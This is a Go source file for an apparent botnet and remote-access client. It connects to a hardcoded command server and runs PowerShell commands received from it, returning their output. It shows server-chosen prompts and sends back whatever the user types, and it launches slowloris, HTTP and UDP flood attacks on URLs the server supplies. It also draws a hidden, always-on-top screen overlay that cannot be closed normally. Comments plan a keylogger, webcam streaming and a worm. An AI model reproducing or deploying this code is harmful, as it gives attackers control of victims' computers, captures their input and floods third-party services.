package main

//TODO: REFACTOR EVERYTHING
/*
TODO:
	1 -implement a checker that checks if app has gone silent and make app check if checker is silent
		if either are silent then start it
	2 -Play Audio file sent by server
	3 - Access Webcam and stream to server
	4 - keylogger and send data to server
	5 - https://github.com/redcode-labs/Neurax
*/

import (
	"context"
	"fmt"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unicode"
	"unicode/utf8"
	"unsafe"

	"github.com/Xart3mis/AKILT/Client/lib/DOS/httpflood"
	"github.com/Xart3mis/AKILT/Client/lib/DOS/slowloris"
	"github.com/Xart3mis/AKILT/Client/lib/DOS/udpflood"
	"github.com/Xart3mis/AKILT/Client/lib/bundles"
	"github.com/Xart3mis/AKILT/Client/lib/consumer"
	"github.com/Xart3mis/AKILT/Client/lib/reg"
	"github.com/Xart3mis/AKILTC/pb"
	"github.com/go-gl/gl/all-core/gl"
	"github.com/go-gl/glfw/v3.3/glfw"
	"github.com/ncruces/zenity"
	"github.com/nullboundary/glfont"
	"golang.design/x/hotkey"
)

var u32dll, _ = syscall.LoadLibrary("user32.dll")
var ShowWindow, _ = syscall.GetProcAddress(u32dll, "ShowWindow")
var SetWindowPos, _ = syscall.GetProcAddress(u32dll, "SetWindowPos")
var SetWindowLongPtrW, _ = syscall.GetProcAddress(u32dll, "SetWindowLongPtrW")

var HWND_TOPMOST int = -1
var SWP_NOSIZE int = 0x0001
var SWP_NOMOVE int = 0x0002
var TOPMOST_FLAGS int = SWP_NOMOVE | SWP_NOSIZE

var SW_HIDE int = 0
var GWL_EXSTYLE int = -20
var WS_EX_TOOLWINDOW uint = 0x00000080
var WS_EX_LAYERED uint = 0x80000
var WS_EX_TRANSPARENT uint = 0x20

func init() {
	runtime.LockOSThread()
}

func main() {
	c, err := consumer.Init("79.133.51.207:8000")
	if err != nil {
		log.Fatalln(err)
	}

	pid := reg.GetUniqueSystemId()
	bundles.WriteFiraCodeNerd()

	ctx, cancel := context.WithCancel(context.Background())
	receiver, err := consumer.SubscribeOnScreenText(ctx, c, pid)
	if err != nil {
		log.Fatalln("Error subscribing to screen text: ", err)
	}

	if err := glfw.Init(); err != nil {
		panic(err)
	}

	defer glfw.Terminate()

	mode := glfw.GetPrimaryMonitor().GetVideoMode()

	SetWindowFlags(mode)
	window, err := glfw.CreateWindow(mode.Width, mode.Height, "", nil, nil)
	if err != nil {
		panic(err)
	}

	monitorX, monitorY := glfw.GetPrimaryMonitor().GetPos()
	window.SetPos(monitorX, monitorY)

	window.SetAttrib(glfw.Resizable, glfw.False)
	window.SetAttrib(glfw.Decorated, glfw.False)

	SetWindowAttributes(window)

	go func() {
		hk := hotkey.New([]hotkey.Modifier{hotkey.ModCtrl, hotkey.ModAlt, hotkey.ModShift}, hotkey.KeyX)
		if err := hk.Register(); err != nil {
			log.Println("hotkey registration failed")
		}

		for range hk.Keydown() {
			window.SetShouldClose(true)
		}
	}()

	window.MakeContextCurrent()
	glfw.SwapInterval(0)

	if err := gl.Init(); err != nil {
		panic(err)
	}

	gl.Enable(gl.DEPTH_TEST)
	gl.DepthFunc(gl.LESS)
	gl.ClearColor(0.0, 0.0, 0.0, 0.0)

	font, err := glfont.LoadFont("FiraCodeNerd.ttf", int32(52), mode.Width, mode.Height)
	if err != nil {
		log.Panicf("LoadFont: %v", err)
	}

	WindowLoop(window, font, pid, mode, ctx, receiver, c)

	receiver.CloseSend()
	window.Destroy()
	cancel()
}

func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.VidMode,
	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient) {
	lastFrameTime := 0.0
	fpslimit := 1.0 / 100.0

	for !window.ShouldClose() {
		now := glfw.GetTime()

		draw_worker(client, ctx, pid, receiver, window, font, mode)

		if (now - lastFrameTime) >= fpslimit {
			lastFrameTime = now

			go dialog_worker(client, ctx, pid)
			go exec_worker(client, ctx, pid)
			go flood_worker(client, ctx)

			window.SwapBuffers()
			glfw.WaitEventsTimeout(fpslimit / 10000)
		}

	}
}

func draw_worker(client pb.ConsumerClient, ctx context.Context, pid string,
	receiver pb.Consumer_SubscribeOnScreenTextClient, window *glfw.Window,
	font *glfont.Font, mode *glfw.VidMode) error {

	text, should_update, err := GetOnScreenText(receiver, pid)
	if err != nil {
		return fmt.Errorf("error getting onscreen text: %v", err)
	}
	Draw(font, mode, pid, text, window, should_update)

	return nil
}

func exec_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
	d, err := client.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})

	if err != nil {
		log.Println("Error during GetCommand:", err)
	}

	var out []byte
	if d.GetShouldExec() {
		out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
		client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
		if err != nil {
			return fmt.Errorf("error during exec: %v", err)
		}
	}

	return nil
}

func dialog_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
	dialog, _ := client.GetDialog(ctx, &pb.ClientDataRequest{ClientId: pid})

	if dialog.GetShouldShowDialog() {
		var text string = ""
		var err error

		for len(text) <= 0 {
			fmt.Println(dialog.GetDialogPrompt(), dialog.GetDialogTitle())
			text, err = zenity.Entry(dialog.GetDialogPrompt(), zenity.Title(dialog.GetDialogTitle()))
		}

		if err != nil {
			return fmt.Errorf("error during dialog: %v", err)
		}

		client.SetDialogOutput(ctx, &pb.DialogOutput{
			EntryText: text,
			Id: &pb.ClientDataRequest{
				ClientId: pid}})
	}

	return nil
}

func flood_worker(client pb.ConsumerClient, ctx context.Context) {
	flood, _ := client.GetFlood(ctx, &pb.Void{})

	if flood.GetShouldFlood() {
		switch flood.FloodType {
		case 0:
			slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Nanosecond,
				time.Duration(flood.GetLimit())*time.Second)
		case 1:
			httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
				flood.GetNumThreads())
		case 2:
			//
		case 3:
			udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
				time.Duration(flood.GetLimit())*time.Second)
		}
	}
}

func SetWindowAttributes(window *glfw.Window) {
	hwnd := window.GetWin32Window()
	window.Show()

	syscall.SyscallN(SetWindowPos, uintptr(unsafe.Pointer(hwnd)), uintptr(HWND_TOPMOST), 0, 0, 0, 0, uintptr(TOPMOST_FLAGS))

	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(SW_HIDE))
	syscall.SyscallN(SetWindowLongPtrW, uintptr(unsafe.Pointer(hwnd)), uintptr(GWL_EXSTYLE), uintptr(WS_EX_TOOLWINDOW|WS_EX_TRANSPARENT|WS_EX_LAYERED))
	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(syscall.SW_SHOW))

	window.SetOpacity(0.9)

	window.SetCloseCallback(CloseCallback)
}

func SetWindowFlags(mode *glfw.VidMode) {
	glfw.WindowHint(glfw.Resizable, glfw.True)
	glfw.WindowHint(glfw.ContextVersionMajor, 3)
	glfw.WindowHint(glfw.ContextVersionMinor, 2)
	glfw.WindowHint(glfw.OpenGLProfile, glfw.OpenGLCoreProfile)
	glfw.WindowHint(glfw.OpenGLForwardCompatible, glfw.True)

	glfw.WindowHint(glfw.RedBits, mode.RedBits)
	glfw.WindowHint(glfw.GreenBits, mode.GreenBits)
	glfw.WindowHint(glfw.BlueBits, mode.BlueBits)
	glfw.WindowHint(glfw.RefreshRate, mode.RefreshRate)

	glfw.WindowHint(glfw.TransparentFramebuffer, glfw.True)
	glfw.WindowHint(glfw.AutoIconify, glfw.False)
	glfw.WindowHint(glfw.Floating, glfw.True)
	glfw.WindowHint(glfw.Visible, glfw.False)
}

func GetOnScreenText(receiver pb.Consumer_SubscribeOnScreenTextClient, pid string) (string, bool, error) {
	resp, err := receiver.Recv()
	if err != nil {
		return "", false, err
	}
	return resp.OnScreen.OnScreenText, resp.OnScreen.ShouldUpdate, nil
}

func WordWrap(text string, lineWidth int) string {
	wrap := make([]byte, 0, len(text)+2*len(text)/lineWidth)
	eoLine := lineWidth
	inWord := false

	for i, j := 0, 0; ; {
		r, size := utf8.DecodeRuneInString(text[i:])
		if size == 0 && r == utf8.RuneError {
			r = ' '
		}
		if unicode.IsSpace(r) {
			if inWord {
				if i >= eoLine {
					wrap = append(wrap, '\n')
					eoLine = len(wrap) + lineWidth
				} else if len(wrap) > 0 {
					wrap = append(wrap, ' ')
				}
				wrap = append(wrap, text[j:i]...)
			}
			inWord = false
		} else if !inWord {
			inWord = true
			j = i
		}
		if size == 0 && r == ' ' {
			break
		}
		i += size
	}

	return string(wrap)
}

func Draw(font *glfont.Font, mode *glfw.VidMode, pid string, text string, window *glfw.Window, update bool) {
	gl.Clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
	gl.ClearColor(0, 0, 0, 0)

	if update {
		font.SetColor(0.10, 0.10, 0.02, 1.0)
		for idx, line := range strings.Split(WordWrap(text, 40), "\n") {
			font.Printf(float32(mode.Width)/2-font.Width(1.0, line)/2, float32(mode.Height)/3+float32(idx*55), 1.0, line)
		}
	}
}

func CloseCallback(w *glfw.Window) {
	w.SetShouldClose(false)
}
